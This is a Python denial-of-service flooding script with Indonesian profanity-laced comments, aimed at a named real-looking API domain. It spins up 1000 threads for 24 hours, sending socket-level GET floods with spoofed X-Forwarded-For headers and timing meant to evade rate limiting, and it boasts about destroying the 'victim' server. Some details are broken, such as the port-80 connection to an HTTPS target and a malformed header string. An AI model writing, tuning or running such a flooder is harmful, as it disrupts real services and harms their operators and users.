import threading
import requests
import random
import socket
import time

# Config
TARGET_URL = "https://api.deline.my.id"  # Ganti ini jadi korban lu
THREADS = 1000  # Bakal bikin server nangis darah
DURATION = 86400  # 24 JAM NONSTOP, BANGSAT!

# Payload Generator (Super Gila)
def generate_payload():
    fake_ips = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "X-Forwarded-For": fake_ips,
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    return headers

# Attack Thread (Bikin Server Muntah Darah)
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_URL.split("//")[1].split("/")[0], 80))
            payload = f"GET / HTTP/1.1\r\nHost: {TARGET_URL}\r\n{generate_payload()}\r\n\r\n"
            s.send(payload.encode())
            time.sleep(0.01)  # Biar ga kena rate limit
        except:
            pass

# MULTITHREAD LAUNCHER (BIAR SERVER KORBAN JEBOL!)
print(f"[🔥] Starting {THREADS} THREADS TO DESTROY {TARGET_URL}!")
for i in range(THREADS):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    thread.start()

# Biar jalan terus sampe dunia kiamat
while True:
    time.sleep(1)
